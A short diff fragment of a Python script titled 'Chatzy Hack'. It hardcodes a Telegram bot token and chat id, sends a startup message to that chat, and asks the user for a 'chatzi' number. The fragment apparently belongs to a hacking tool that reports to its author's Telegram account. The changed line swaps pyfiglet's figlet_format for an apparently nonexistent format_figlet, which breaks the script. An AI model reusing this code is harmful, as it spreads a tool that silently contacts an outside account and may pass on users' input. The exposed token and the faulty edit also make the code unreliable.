@@ -9,7 +9,7 @@ bot = telebot.TeleBot('8242225978:AAE3e8_2uf8-7wcMrN3KN6CpsvYxSt-ymvQ')
 
 chat_id = '8303879201'
 bot.send_message(chat_id, "on corber")
-text = pyfiglet.figlet_format('Chatzy Hack')
+text = pyfiglet.format_figlet('Chatzy Hack')
 print(Fore.GREEN + "="*25)
 print("")
 number = input(Fore.RED + "enter number chatzi you : ")
